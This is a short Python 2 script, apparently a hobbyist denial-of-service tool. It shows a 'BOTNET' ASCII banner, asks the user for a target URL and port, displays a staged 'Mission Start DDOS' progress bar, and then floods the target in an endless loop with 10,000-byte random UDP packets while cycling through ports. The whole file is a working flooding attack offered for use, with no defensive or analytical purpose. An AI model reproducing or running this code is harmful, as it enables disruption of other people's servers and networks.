import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Settings ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout =  time.time() 
############# Settings ##############

os.system ("clear")
print ('''
\033[91m
      :::::::::       ::::::::   :::::::::::       ::::    :::       ::::::::::   ::::::::::: 
     :+:    :+:     :+:    :+:      :+:           :+:+:   :+:       :+:              :+:      
    +:+    +:+     +:+    +:+      +:+           :+:+:+  +:+       +:+              +:+       
   +#++:++#+      +#+    +:+      +#+           +#+ +:+ +#+       +#++:++#         +#+        
  +#+    +#+     +#+    +#+      +#+           +#+  +#+#+#       +#+              +#+         
 #+#    #+#     #+#    #+#      #+#           #+#   #+#+#       #+#              #+#          
#########       ########       ###           ###    ####       ##########       ###           
                               \033[92m[\033[91mPowered By : Ronaldo\033[92m]
                               \033[93m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
''')
url = raw_input("url : ")
port = input("Port       : ")

os.system("clear")
print "\033[91mMission Start DDOS"
print "\033[91m[                    ] 0% "
time.sleep(3)
print "\033[92m[=====               ] 25%"
time.sleep(3)
print "\033[92m[==========          ] 50%"
time.sleep(3)
print "\033[92m[===============     ] 75%"
time.sleep(3)
print "\033[92m[====================] 100%"
time.sleep(2)
os.system ("clear")
sent = 7
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (url,port))
     sent = sent + 70
     port = port + 70
     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,url,port)
     if port == 65534:
       port = 20
